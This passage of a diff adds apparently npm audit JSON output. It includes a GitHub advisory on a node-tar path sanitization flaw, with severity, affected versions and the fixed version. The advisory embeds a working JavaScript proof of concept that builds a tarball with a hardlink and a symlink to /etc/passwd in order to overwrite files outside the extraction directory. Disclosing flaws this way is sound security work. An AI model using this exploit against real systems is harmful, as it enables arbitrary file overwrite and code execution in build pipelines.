and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",
+      "reported_by": null,
+      "title": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-23745"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.2",
+      "github_advisory_id": "GHSA-8qq5-rm4j-mr97",
+      "recommendation": "Upgrade to version 7.5.3 or later",
+      "patched_versions": ">=7.5.3",
+      "updated": "2026-01-16T21:16:24.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-8qq5-rm4j-mr97"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 5,
+      "moderate": 0,
+      "high": 7,
+      "critical": 0
+    },
+    "dependencies": 4364,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 4364
+  }
+}
